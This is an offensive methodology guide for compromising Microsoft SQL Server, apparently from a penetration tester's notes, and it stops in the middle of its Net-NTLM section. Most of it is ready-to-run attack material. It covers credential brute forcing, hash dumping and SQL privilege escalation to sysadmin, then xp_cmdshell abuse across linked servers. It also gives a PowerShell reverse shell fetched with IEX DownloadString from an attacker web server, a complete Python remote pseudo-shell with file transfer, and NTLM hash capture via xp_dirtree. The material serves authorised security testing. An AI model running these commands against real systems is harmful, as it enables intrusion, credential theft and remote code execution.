# Microsoft SQL Server (MSSQL) - Methodology

### MSSQL instances discovery

If Active Directory domain credentials are known, a list of the domain service
accounts referencing in their `ServicePrincipalName (SPN)` a MSSQL service
can be requested in order to identify the MSSQL instances, that make use of the
Kerberos authentication protocol, within the domain. As the SPN for service
accounts follow the naming convention `<SERVICE>/<HOST>`, SPN starting with
`MSSQL` are linked to MSSQL instances.

The `PowerShell` cmdlets `Get-ADUser`, of the Active Directory module for
`PowerShell` and `Get-SQLInstanceDomain`, of the `PowerUpSQL` suite, can be used
to conduct the search:

```ruby
# List the SPN containing "MSSQL" to detect if any abnormality is present in any SPN naming
Get-ADUser -Filter { servicePrincipalName -like "*MSSQL*" } -Properties servicePrincipalName | Select-Object SamAccountName,servicePrincipalName

# List the hostname specified in the SPNs referencing a MSSQL service
Get-ADUser -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }

# Using credentials from another domain
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)
Get-ADUser -Server <DC_IP> -Credential $creds -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }

# Use the current user login (NTLM / Kerberos tickets)
Get-SQLInstanceDomain -Verbose

# Using credentials from another domain
runas /noprofile /netonly /user:<DOMAIN>\<USERNAME> PowerShell.exe
import-module PowerUpSQL.psd1
Get-SQLInstanceDomain -Verbose -DomainController <DC_IP> -Username <DOMAIN>\<USERNAME> -password <PASSWORD>
```

`nmap` can be used to scan the network for exposed MSSQL databases:

```bash
nmap -v -p 1433 -sV -sC -oA nmap_mssql <RANGE | CIDR>
```

### Service recon

The `nmap` `MSSQL-info.nse` script attempts to determine configuration and
version information for Microsoft SQL Server.  
The script will first gather information by querying the SQL Server Browser
service (that runs by default on UDP port 1434 and provides imprecise
version information) and then sending a probe to the instance to conduct
response packet analysis.

```bash
nmap --script MSSQL-info --script-args mssql.instance-port=1433 -p 1433 <TARGET>
```

The `metasploit` `auxiliary/scanner/mssql/mssql_ping` module attempts to
retrieve similar information:

```bash
msf > use auxiliary/scanner/mssql/mssql_ping
```

### Authentication weaknesses

###### Empty password

Whenever targeting a large number of MSSQL services, the `nmap` nse script
`MSSQL-empty-password.nse` can be used to quickly try to connect using the
`sa` account and a blank password:

```bash
nmap -v -sT -p 1433 --script=MSSQL-empty-password.nse <HOSTS>
```

###### Authentication brute force

The `Metasploit` `auxiliary/scanner/mssql/mssql_login` module can be used to
brute force credentials for the service. The "BLANK_PASSWORDS" option is worth
setting to "true".  

The `patator` tool can be used as well to brute force credentials on the
service:

```bash
patator mssql_login host=<IP> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='Login failed for user'

msf > use auxiliary/scanner/mssql/mssql_login
```

### Data retrival

The `sqsh` Linux utility as well as the `impacket` Python script
`mssqlclient.py` can be used to make queries to the database:

```bash
sqsh -U <USERNAME> -P <PASSWORD> -S <IP>:<PORT>

# -db is optional and defaults to "None"
mssqlclient.py -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>

# Windows authentication using the provided credentials
mssqlclient.py -windows-auth -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>

# Kerberos authentication
mssqlclient.py -k -dc-ip <DC_IP> -db <DB_NAME> <DOMAIN | WORKGROUP>/<USERNAME>:<PASSWORD>@<HOSTNAME | IP>
```

The `DBeaver` GUI tool can be used to simply access the database content
through a graphical interface without the need to know the underlying MSSQL
query syntax.

###### Dump hashes

If provided with an user credentials of appropriate DB privileges, the `nmap`
NSE script `MSSQL-dump-hashes.nse` can be used to dump the password hashes
from an MSSQL server in a format suitable for cracking by tools such as
`John-the-ripper`.

```bash
nmap -v -sT -p <PORT> --script=MSSQL-dump-hashes.nse --script-args='mssql.username=<USERNAME>,mssql.password=<PASSWORD>' <IP>
```

### Privileges escalation

###### MSSQL server-level and database-level roles

MSSQL provides a roles mechanism which, similarly to groups in the Microsoft
Windows operating system, makes use of security principals that group other
principals and define server-wide or database-wide permissions. Permissions are
the rights to access and modify the service configuration and databases objects.

`Server roles` have a server-wide scope while `database role` are database-wide
in their permissions scope.

There are two types of MSSQL roles:
  - `fixed roles`, that have a fixed and defined set of permissions
  - `user-defined roles`, that can be manually created and assigned permissions

The following table shows the fixed-server roles and their capabilities:

| Fixed-server role name | Description |
|------------------------|-------------|
| `sysadmin` | Encompasses all other roles and can perform any activity in the server. |
| `serveradmin` | Can change server-wide configuration options and shut down the server. `serveradmin` can activate and make use of `xp_cmdshell`. |
| `securityadmin` | Manage logins and is granted the `ALTER ANY LOGIN` permission which allows `GRANT`, `DENY`, and `REVOKE` operations on server-level permissions and database-level permissions (for the database the user granted the role has access to). While `securityadmin` can *not* assign user roles (such as `sysadmin` or `serveradmin`), assigning the `CONTROL SERVER` permission can result in privileges escalation to `sysadmin` (process detailed below). |
| `processadmin` | Can end processes that are running in an instance of SQL Server. |
| `setupadmin` | Can add and remove linked servers by using `Transact-SQL` statements. |
| `bulkadmin` | Can run the `BULK INSERT` statement. |
| `diskadmin` | Manage disk files |
| `dbcreator` | Can create, alter, drop, and restore any database |
| `public` | Every SQL Server login belongs to the `public` server role. When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to `public` on that object. `public` is implemented differently than other roles, and permissions can be granted, denied, or revoked from the role. |

The following table shows the fixed-database roles and their capabilities:

| Fixed-database role name | Description |
|--------------------------|-------------|
| `db_owner` | Can perform all configuration and maintenance activities on the database and can also drop the database. |
| `db_securityadmin` | Can modify role membership for custom roles only, create users without logins, and manage permissions. |
| `db_accessadmin` | Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins. |
| `db_backupoperator` | Can back up the database. |
| `db_ddladmin` | Can run any Data Definition Language (DDL) command in a database. |
| `db_datawriter` | Can add, delete, or change data in all user tables. |
| `db_datareader`	| Can read all data from all user tables. |
| `db_denydatawriter` | Can *not* add, modify, or delete any data in the user tables within a database. |
| `db_denydatareader` | Can *not* read any data in the user tables within a database. |

###### Enumerate user's roles and permissions

```sql
-- Returns the name of the current security context.
SELECT USER_NAME()
SELECT CURRENT_USER

-- Returns the login identification name, DOMAIN\USERNAME for Windows authentication USERNAME for SQL Server Authentication
-- If the user name and login name are different, SYSTEM_USER returns the login name
SELECT SYSTEM_USER
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID

-- Is the current user sysadmin or serveradmin
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT IS_SRVROLEMEMBER('serveradmin')

-- Is the specified user (login name) sysadmin or serveradmin
SELECT IS_SRVROLEMEMBER('sysadmin', '<USERNAME>')
SELECT IS_SRVROLEMEMBER('serveradmin', '<USERNAME>')

-- List specified user's roles
SELECT u.name, r.name FROM sys.database_role_members AS m INNER JOIN sys.database_principals AS r ON m.role_principal_id = r.principal_id INNER JOIN sys.database_principals AS u ON u.principal_id = m.member_principal_id WHERE u.name = '<USERNAME>';

-- List current users permissions
SELECT entity_name, permission_name FROM sys.fn_my_permissions(NULL, NULL)

-- List users with the sysadmin role
exec sp_helpsrvrolemember @srvrolename='sysadmin'
SELECT 'Name' = sp.NAME,sp.is_disabled AS [Is_disabled] FROM sys.server_role_members rm inner join sys.server_principals sp on rm.member_principal_id = sp.principal_id WHERE rm.role_principal_id = SUSER_ID('sysadmin')

-- List users with the sysadmin role or "Control Server" permission
SELECT DISTINCT p.name AS [loginname], p.type, p.type_desc, p.is_disabled, s.sysadmin, CONVERT(VARCHAR(10), p.create_date ,101) AS [created],CONVERT(VARCHAR(10), p.modify_date, 101) AS [update] FROM sys.server_principals p JOIN sys.syslogins s ON p.sid = s.sid JOIN sys.server_permissions sp ON p.principal_id = sp.grantee_principal_id WHERE p.type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN', 'WINDOWS_GROUP') AND p.name NOT LIKE '##%' AND (s.sysadmin = 1 OR sp.permission_name = 'CONTROL SERVER') ORDER BY p.name
```

###### IMPERSONATE permission

The `IMPERSONATE` permission allows for the context switching of a SQL
statement by impersonating another login or database user. An user granted the
`IMPERSONATE` permission can thus elevate its privileges to the ones of the
user he is allowed to impersonate, resulting in a potential elevation of
privileges.    

This permission is implied for the `sysadmin` role for all databases, and
the `db_owner` role members in databases that they own.

The following queries can be used to exploit the `IMPERSONATE` permission:

```sql
-- List the SQL Server logins that can be impersonated by the current user
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

-- Swith the execution context of the session to the specified user. Requires the IMPERSONATE permission on the specified user.
EXECUTE AS LOGIN = '<USERNAME>'
```

The `Metasploit`'s `auxiliary/admin/mssql/mssql_escalate_execute_as` module and
the `PowerShell` cmdlet `Invoke-SQLAuditPrivImpersonateLogin` of the
`PowerUpSQL` suite can be used to automate the impersonation of an user having
the `sysadmin` role :

```bash
msf5> use auxiliary/admin/mssql/mssql_escalate_execute_as

Invoke-SQLAuditPrivImpersonateLogin -Instance <HOSTNAME | IP>\<INSTANCE> -Username <USERNAME> -Password <PASSWORD> -Exploit
Invoke-SQLAuditPrivImpersonateLogin -Instance <HOSTNAME | IP>\<INSTANCE> -Credential <PSCredential> -Exploit
```

###### securityadmin role / "CONTROL SERVER" permission to sysadmin

The `securityadmin` role or the `CONTROL SERVER` permission can be exploited to
gain `sysadmin` access.

Indeed the `CONTROL SERVER` permission can be used to grant the permission to
impersonate an user with the `sysadmin` role, such as `sa`. While the
`securityadmin` role can *not* assign user roles, the role can be used to
create an account and assign it the `CONTROL SERVER` permission.

```sql
-- Is the current user securityadmin / has the "CONTROL SERVER" permission
-- SELECT system_user; SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID;
SELECT IS_SRVROLEMEMBER('securityadmin')
SELECT HAS_PERMS_BY_NAME(null, null, 'CONTROL SERVER');

-- List users with the securityadmin role
exec sp_helpsrvrolemember @srvrolename='securityadmin'
SELECT 'Name' = sp.NAME,sp.is_disabled AS [Is_disabled] FROM sys.server_role_members rm inner join sys.server_principals sp on rm.member_principal_id = sp.principal_id WHERE rm.role_principal_id = SUSER_ID('securityadmin')

-- List users with the "CONTROL SERVER" permission
SELECT login.name, perm.permission_name, perm.state_desc FROM sys.server_permissions perm JOIN sys.server_principals login ON perm.grantee_principal_id = login.principal_id WHERE permission_name = 'CONTROL SERVER';

-- SQL query to create an user
CREATE LOGIN [<USERNAME>] WITH PASSWORD = '<PASSWORD>';
GO

-- From the user with the securityadmin role
GRANT CONTROL SERVER TO [<USERNAME>];
GO

-- From user with the "CONTROL SERVER" permission
GRANT IMPERSONATE ON LOGIN::<sa | USER_SYSADMIN> TO [<USERNAME>];
GO
```

###### TRUSTWORTHY database db_owner role to sysadmin

Having the `db_owner` role in a `TRUSTWORTHY` database (a database with the
`TRUSTWORTHY` property set to true) owned by a user that has the `sysadmin`
role can be leveraged to escalate privileges to `sysadmin`.

Indeed a stored procedure, declared by a database owner, that is set to
`EXECUTE AS OWNER` will, during execution, acquire the server level permissions
of the actual database owner if the database's `TRUSTWORTHY` property is set.
Thus, if a database is `TRUSTWORTHY` and owned by an user having the
`sysadmin` role, any user having the `db_owner` role on the database can
elevate its privileges to `sysadmin`.   

```sql
-- List the value of the property TRUSTWORTHY property for all databases
SELECT name, is_trustworthy_on from sys.databases

-- Get the owner of the specified database
SELECT name AS 'Database', suser_sname(owner_sid) AS 'Creator' from sys.databases WHERE name = '<DATABASE_NAME>';

--  Automates the search of trustworthy databases owned by a sysadmin
SELECT d.name AS DATABASENAME FROM sys.server_principals r INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id INNER JOIN sys.server_principals p ON p.principal_id = m.member_principal_id inner join sys.databases d on suser_sname(d.owner_sid) = p.name WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin'

-- Has the current user the db_owner role on the database
USE <DB_NAME>
SELECT IS_MEMBER('db_owner')

-- Create the stored procedure to add the sysadmin role to the specified user
CREATE PROCEDURE sp_elevate_user WITH EXECUTE AS OWNER AS begin EXEC sp_addsrvrolemember '<USERNAME>','sysadmin' end;
GO

-- Execute the stored procedure to elevate privileges
sp_elevate_user
GO

-- Remove the stored procedure
DROP PROC sp_elevate_user;
GO
```

The `Metasploit`'s `auxiliary/admin/mssql/mssql_escalate_dbowner` module and
the `PowerShell` cmdlet `Invoke-SqlServer-Escalate-DbOwner` can be used to
automate the process:

```bash
msf5> use auxiliary/admin/mssql/mssql_escalate_dbowner

# Grant user used to login the `sysadmin` role
Invoke-SqlServer-Escalate-DbOwner -SqlServerInstance <HOSTNAME | IP>\<INSTANCE> -SqlUser <USERNAME> -SqlPass <PASSWORD>

# Create a new user and grant him the `sysadmin` role
Invoke-SqlServer-Escalate-DbOwner -SqlServerInstance <HOSTNAME | IP>\<INSTANCE> -SqlUser <USERNAME> -SqlPass <PASSWORD> -newuser <NEW_USERNAME> -newPass <NEW_PASSWORD>
```

###### PowerUpSQL's Invoke-SQLAudit / Invoke-SQLEscalatePriv

The `PowerShell` cmdlets `Invoke-SQLAudit` and `Invoke-SQLEscalatePriv`, of
the `PowerUpSQL` suite, can be used to detect and exploit path that can be
leveraged to escalate privileges.

The `Invoke-SQLEscalatePriv` cmdlet will call the `Invoke-SQLAudit` cmdlet
with the `-Exploit` flag to detect and automatically exploit the following
misconfigurations / vulnerabilities in order to escalate to the `sysadmin`
role:
  - `IMPERSONATE` permission
  - `TRUSTWORTHY` database `db_owner`
  - `CREATE PROCEDURE` permission

The cmdlets will moreover conduct various other checks: availability of the
stored procedures `xpdirtree` and `xp_fileexist` for the specified user,
configuration of server database links, etc.

```bash
# Install-Module -Name PowerUpSQL
# IEX(New-Object System.Net.WebClient).DownloadString("https://<WEBSERVER_IP>:<WEBSERVER_PORT>/PowerUpSQL.ps1")

Invoke-SQLAudit -Instance <HOSTNAME | IP>\<INSTANCE> -Username <USERNAME> -Password <PASSWORD> -Exploit
Invoke-SQLAudit -Instance <HOSTNAME | IP>\<INSTANCE> -Credential <PSCredential> -Exploit
```

###### Windows local administrator privileges to SQL Server `sysadmin`

Among other techniques, such as dumping the LSA secrets, the impersonation of
an MSSQL service account can be used to access an MSSQL service as `sysadmin`
after obtaining local administrator privileges on a Windows host.

`PowerUpSQL`'s `Invoke-SQLImpersonateService` can be used to conduct the
impersonation in order to run futher `PowerUpSQL` as `sysadmin`:

```bash
# IEX(New-Object System.Net.WebClient).DownloadString("https://<WEBSERVER_IP>:<WEBSERVER_PORT>/PowerUpSQL.ps1")

Invoke-SQLImpersonateService -Verbose -Instance <HOSTNAME | IP>\<INSTANCE>

Get-SQLServerInfo -Verbose -Instance <HOSTNAME | IP>\<INSTANCE>
# CurrentLogin           : NT Service\MSSQL$<INSTANCE>
```  

### Linked servers

The linked server mechanism allows for access to others `Object Linking and
Embedding, Database (OLE DB)` data sources outside of the present MSSQL
instance. The mechanism can be used at the database level to connect to and
query a variety of data stores including, but not limited to:
 - SQL Servers
 - Oracle Servers
 - Text Files
 - Excel Files

A server link can be configured to use the current security context of the
login, a specified Windows or MSSQL login of the linked server, or be disabled
if no credentials are provided. By default, any login that belongs to the
`PUBLIC` role can query a database through a server link and may thus use the
configured credentials (if any).

Moreover, stored procedures, such as `xp_cmdshell`, can be executed over
a server link, according to the configured login roles and permissions. Note
that outgoing RPC connections, `RPC Out`, need to be enabled on the link to
conduct reconfiguration operations to enable `xp_cmdshell` on the linked
instance.

The `OPENQUERY` and  `EXEC [...] AT` functions can be used to execute SQL
statements on the specified linked server. Note that the statement executed by
`OPENQUERY` must return a value, so a `SELECT 1;` is needed for otherwise
return less queries. Additionally, `RPC Out` must be enabled in order to use
`EXEC [...] AT` statements.

SQL statements can be nested through the `OPENQUERY` and  `EXEC [...] AT`
functions. Thus, server links can be followed from server to server. To escape
the single quote character, inside a string quoted with `'`, it should be
written as `''`.

```sql
-- List the linked servers
SELECT srvname from master..sysservers

-- Check if RPC Out is enabled for the specified linked server
EXEC ('master.dbo.sp_helpdb') AT [<HOSTNAME | IP>\<INSTANCE>]

-- Basic login recon
SELECT * FROM OPENQUERY("<HOSTNAME | IP>\<INSTANCE>", 'SELECT SYSTEM_USER')
SELECT * FROM OPENQUERY("<HOSTNAME | IP>\<INSTANCE>", 'SELECT is_srvrolemember(''sysadmin'')')

-- List linked servers configured of the specified linked server
SELECT * FROM OPENQUERY("<HOSTNAME | IP>\<INSTANCE>", 'SELECT srvname from master..sysservers')

-- Nested queries for basic recon on the second MSSQL instance
SELECT * FROM OPENQUERY("<HOSTNAME1 | IP1>\<INSTANCE1>", 'SELECT * FROM OPENQUERY("<HOSTNAME2 | IP2>\<INSTANCE2>", ''SELECT is_srvrolemember(''''sysadmin'''')'')')
EXEC ('EXEC (''SELECT is_srvrolemember(''''sysadmin'''')'') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]

-- Create an user and give it the sysadmin role
EXEC ('CREATE LOGIN <USERNAME> WITH PASSWORD = ''<PASSWORD>'';') AT [<HOSTNAME | IP>\<INSTANCE>]
EXEC ('EXEC master.dbo.sp_addsrvrolemember ''<USERNAME>'',''sysadmin'';') AT [<HOSTNAME | IP>\<INSTANCE>]
-- Nested in order to create the login on the second MSSQL instance
EXEC ('EXEC (''CREATE LOGIN <USERNAME> WITH PASSWORD = ''''<PASSWORD>'''''') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
EXEC ('EXEC (''EXEC master.dbo.sp_addsrvrolemember ''''<USERNAME>'''',''''sysadmin'''''') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]

-- xp_cmdshell
EXEC ('EXEC (''xp_cmdshell ''''<CMD>'''''') AT [<HOSTNAME2 | IP2>\<INSTANCE2>];') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
EXEC ('xp_cmdshell ''<CMD>''') AT [<HOSTNAME1 | IP1>\<INSTANCE1>]
SELECT * FROM OPENQUERY("[<HOSTNAME | IP>\<INSTANCE>]",'EXEC master..xp_cmdshell ''<CMD>''')
-- SELECT 1 must be added if the command executed through xp_cmdshell does not return any result
SELECT * FROM OPENQUERY("[<HOSTNAME | IP>\<INSTANCE>]",'SELECT 1; EXEC master..xp_cmdshell ''<CMD>''')
SELECT * FROM OPENQUERY("[<HOSTNAME1 | IP1>\<INSTANCE1>]", 'SELECT * FROM OPENQUERY("[<HOSTNAME2 | IP2>\<INSTANCE2>]", ''xp_cmdshell whoami;'')');
```

The `Metasploit` module `exploit/windows/mssql/mssql_linkcrawler` can be used
to automatically and recursively crawl the configured server links and deploy
payloads if the `DEPLOY` is set to `True`:

```
msf> use exploit/windows/mssql/mssql_linkcrawler
```

### OS commands execution

On MSSQL server, operating system commands can be executed using the
*xp_cmdshell* function. The *xp_cmdshell* function is deactivated by default
from SQL Server 2000 and upwards and needs to be activated.  

Note that the Windows process spawned by `xp_cmdshell` has the same security
rights as the SQL Server service account running the service.

###### `xp_cmdshell` activation

The following query can be used to manually activate it given the account used
has sufficient privilege (sysadmin):

```SQL
-- To allow advanced options to be changed.  
EXEC sp_configure 'show advanced options', 1;  
GO  

-- To update the currently configured value for advanced options.  
RECONFIGURE;  
GO  

-- To enable the feature.  
EXEC sp_configure 'xp_cmdshell', 1;  
GO

-- To update the currently configured value for this feature.  
RECONFIGURE;  
GO  
```

Operating system CMD commands can then be executed:

```SQL
EXEC xp_cmdshell '<CMD>'
GO  
```

The SQL queries above can be made using the `sqsh` Linux utility as well as
the `impacket` Python script `mssqlclient.py`. The `mssqlclient.py` client
integrates the `enable_xp_cmdshell` and `xp_cmdshell` commands to automatically
enable xp_cmdshell and execute command through it.

```bash
# mssqlclient.py ...
SQL> enable_xp_cmdshell
SQL> xp_cmdshell <CMD>
SQL> sp_start_job <CMD>
```

###### PowerShell reverse shell

In order to execute command through a system shell, the `PowerShell` `Nishang`'s
`Invoke-PowerShellTcp.ps1` can be used.

Once a web server hosting the `PowerShell` script and a listener are up and
running, the following commands can be used to download and execute the script
through the MSSQL service:

```sql
EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>;"

-- Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port> must be added at the end of the script
EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellTcp.ps1')"
```

###### Metasploit

The `Metasploit` module `exploit/windows/mssql/mssql_payload` automates the
tasks above to deploy a payload, such as a reverse `meterpreter`, on the server
through the MSSQL service.

The module `exploit/windows/mssql/mssql_payload_sqli` works similarly and can
be used through an SQL injection.

###### Standalone MSSQL shell for constrained environments

If outbound traffic (TCP, UDP, ICMP, etc.) is being blocked, the following
`Python` script can be used as a pseudo shell by making use of `xp_cmdshell`
and keeping track of the current working directory. The script also provides a
way to upload / download files using multiple echo commands in order to write a
base64-encoded file on the server and decoding it using the `certutil` utility.  

```python
#!/usr/bin/env python2
from __future__ import print_function

# Author: Alamot
# Download functionality: Qazeer
# Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
# To upload a file, type: UPLOAD local_path remote_path
# e.g. UPLOAD myfile.txt C:\temp\myfile.txt
# If you omit the remote_path it uploads the file on the current working folder.
# To dowload a file from the remote host, type: DOWNLOAD remote_path [local_path]
# e.g. DOWNLOAD myfile.txt
# Or DOWNLOAD remotefile.txt /tmp/file.txt
# Be aware that pymssql has some serious memory leak issues when the connection fails (see: https://github.com/pymssql/pymssql/issues/512).
import _mssql
import base64
import ntpath
import os
import random
import shlex
import string
import sys
import tqdm
import hashlib
from io import open
try: input = raw_input
except NameError: pass

MSSQL_SERVER = '<IP>'
MSSQL_USERNAME = '<USERNAME>'
MSSQL_PASSWORD = '<PASSWORD>'
BUFFER_SIZE = 5*1024
TIMEOUT = 30


def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""
    rows = list(mssql)
    for row in rows[:-3]:
        columns = row.keys()
        print(row[columns[-1]])
    if len(rows) >= 3:
        (username, computername) = rows[-3][rows[-3].keys()[-1]].split('|')
        cwd = rows[-2][rows[-3].keys()[-1]]
    return (username.rstrip(), computername.rstrip(), cwd.rstrip())


def upload(mssql, stored_cwd, local_path, remote_path):
    print("Uploading "+local_path+" to "+remote_path)
    cmd = 'type nul > "' + remote_path + '.b64"'
    mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")

    with open(local_path, 'rb') as f:
        data = f.read()
        md5sum = hashlib.md5(data).hexdigest()
        b64enc_data = "".join(base64.encodestring(data).split())

    print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
    for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
        cmd = 'echo '+b64enc_data[i:i+BUFFER_SIZE]+' >> "' + remote_path + '.b64"'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        #print("Remaining: "+str(len(b64enc_data)-i))

    cmd = 'certutil -decode "' + remote_path + '.b64" "' + remote_path + '"'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    process_result(mssql)
    cmd = 'certutil -hashfile "' + remote_path + '" MD5'
    mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
    if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
        print("MD5 hashes match: " + md5sum)
    else:
        print("ERROR! MD5 hashes do NOT match!")


def dowload(mssql, stored_cwd, remote_path, local_path=""):
    try:
        remote_path = remote_path.replace('"', '').replace('\'', '')
        if local_path == "":
            local_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ntpath.basename(remote_path))

        print("Downloading " + remote_path + " to " + local_path)

        tmp_filename = '%TEMP%\\' + id_generator() + ".b64"
        cmd = 'del "' + tmp_filename + '"'
        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")

        cmd = 'certutil -encode "' + remote_path + '" "' + tmp_filename + '"'
        mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")

        cmd = 'type "' + tmp_filename + '"'
        mssql.execute_query("EXEC xp_cmdshell 'cd " + stored_cwd + " & " + cmd + " & echo %username%^|%COMPUTERNAME% & cd'")

        certutil_result = list(mssql)

        if "CERTIFICATE-----" not in str(certutil_result[0][0]):
            raise Exception("ERROR! Encoding with Certutil failed!")

        file_b64 = ""
        for row in certutil_result[1:-4]:
            columns = list(row)
            file_b64 += row[columns[-1]]

        with open(local_path, 'wb') as f:
            data = base64.b64decode(file_b64, None)
            md5sum = hashlib.md5(data).hexdigest()
            f.write(data)

        tmp_filename = '%TEMP%\\' + tmp_filename + ".b64"
        cmd = 'del "' + tmp_filename + '"'
        mssql.execute_query("EXEC xp_cmdshell '" + cmd + "'")

        cmd = 'certutil -hashfile "' + remote_path + '" MD5'
        mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
        if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
            print("MD5 hashes match: " + md5sum)
        else:
            Exception("ERROR! MD5 hashes do NOT match!")

        return "echo *** DOWNLOAD PROCEDURE FINISHED ***"

    except Exception as e:
        return "echo *** ERROR WHILE DOWNLOADING THE FILE: " + e + " ***"


def shell():
    mssql = None
    stored_cwd = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        print("Successful login: "+MSSQL_USERNAME+"@"+MSSQL_SERVER)

        print("Trying to enable xp_cmdshell ...")
        mssql.execute_query("EXEC sp_configure 'show advanced options',1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell',1;RECONFIGURE")

        cmd = 'echo %username%^|%COMPUTERNAME% & cd'
        mssql.execute_query("EXEC xp_cmdshell '"+cmd+"'")
        (username, computername, cwd) = process_result(mssql)
        stored_cwd = cwd

        while True:
            cmd = raw_input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
            if cmd.lower()[0:4] == "exit":
                mssql.close()
                return
            elif cmd[0:6] == "UPLOAD":
                upload_cmd = shlex.split(cmd, posix=False)
                if len(upload_cmd) < 3:
                    upload(mssql, stored_cwd, upload_cmd[1], stored_cwd+"\\"+upload_cmd[1])
                else:
                    upload(mssql, stored_cwd, upload_cmd[1], upload_cmd[2])
                cmd = "echo *** UPLOAD PROCEDURE FINISHED ***"
            elif cmd[0:8] == "DOWNLOAD":
                dowload_cmd = shlex.split(cmd, posix=False)
                if len(dowload_cmd) < 3:
                    cmd = dowload(mssql, stored_cwd, dowload_cmd[1])
                else:
                    cmd = dowload(mssql, stored_cwd, dowload_cmd[1], dowload_cmd[2])
            mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
            (username, computername, cwd) = process_result(mssql)
            stored_cwd = cwd

    except _mssql.MssqlDatabaseException as e:
        if  e.severity <= 16:
            print("MSSQL failed: "+str(e))
        else:
            raise
    finally:
        if mssql:
            mssql.close()

shell()
sys.exit()
```

### Net-NTLM stealer and relaying

The (undocumented) `xp_dirtree`, `xp_fileexist` and `xp_getfiledetails` SQL
stored procedures can be used to access files on remote systems over `SMB`.
The account running the SQL service, be it a local or domain joined account,
will authenticate to the `SMB` share by completing a `Net-NTLMv1` or
`Net-NTLMv2` challenge.

This response can be offline cracked to retrieve the password of the SQL
service account. The authentication challenge can also be relayed in order
to directly execute commands as the account running the SQL service through the
`SMB` service of a targeted server. The targeted server must expose a `SMB`
service that does not require message signing and the SQL service account must
have local administrator privileges on the server. For more information on how
to conduct this attack, refer to the `Active Directory - NTLM Relaying` note.   

Depending on the permissions configured to use the procedures, a non privileged
user may be able to execute them. Usually, the account connecting to the
database should only require the `PUBLIC` role to execute the procedures.

To capture the `Net-NTLM` response, a `SMB` share service or `Responder` must
be started:

```bash
smbserver.py -smb2support <SHARE_NAME> /tmp

Responder.py -I <INTERFACE>
```

Then, from a connected SQL interpreter, the methods can be used to make a
connection to the `SMB` service:

```sql
-- METHOD = xp_dirtree / xp_fileexist / xp_getfiledetails
<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
EXEC <METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
EXEC <METHOD> '\\<HOSTNAME | IP>\Whatever_Share',1,1;
EXEC master.dbo.<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
```

The `metasploit` module `auxiliary/admin/mssql/mssql_ntlm_stealer` and the
`msdat` `Python` script can be used to try the three methods above
automatically:

```bash
# Only tries xp_dirtree and xp_fileexist
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

